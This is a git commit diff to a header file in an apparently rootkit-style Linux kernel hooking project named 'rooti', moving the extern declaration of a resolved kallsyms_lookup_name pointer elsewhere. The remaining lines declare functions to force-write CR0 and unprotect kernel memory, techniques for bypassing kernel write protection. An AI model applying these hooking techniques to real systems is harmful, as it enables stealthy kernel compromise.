2d3c12ecd0f078b907bf54f9eb77209ad50d8316
Omri Ben Zikri <omribenzikri10@gmail.com>
2025-08-15 20:07:48 +0000

    Moved kallsyms_lookup_name reference to generic utils

--- src/hooking/utils.h
+++ src/hooking/utils.h
@@ -1,12 +1,6 @@
 #ifndef _ROOTI_HOOKING_UTILS_H
 #define _ROOTI_HOOKING_UTILS_H
 
-/*
-    Reference to the kallsyms_lookup_name() kernel function which is no longer exported. 
-    The address of this pointer is resolved by the initialization function in utils.c
-*/
-extern unsigned long (*__kallsyms_lookup_name)(const char *name);
-
 inline void rooti_force_write_cr0(unsigned long val);
 inline void rooti_unprotect_memory(void);
 inline void rooti_protect_memory(void);
